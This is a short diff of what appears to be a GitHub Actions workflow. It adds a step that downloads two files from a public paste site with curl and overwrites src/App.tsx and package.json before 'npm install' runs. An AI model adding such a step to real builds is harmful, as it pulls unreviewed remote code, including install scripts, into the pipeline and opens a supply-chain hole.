@@ -19,6 +19,11 @@ jobs:
           distribution: temurin
           java-version: '17'
 
+      - name: Baixar arquivos atualizados
+        run: |
+          curl -s https://dpaste.com/AG9MTDGFG.txt -o src/App.tsx
+          curl -s https://dpaste.com/ACA5VAPU9.txt -o package.json
+
       - name: Install dependencies
         run: npm install
         
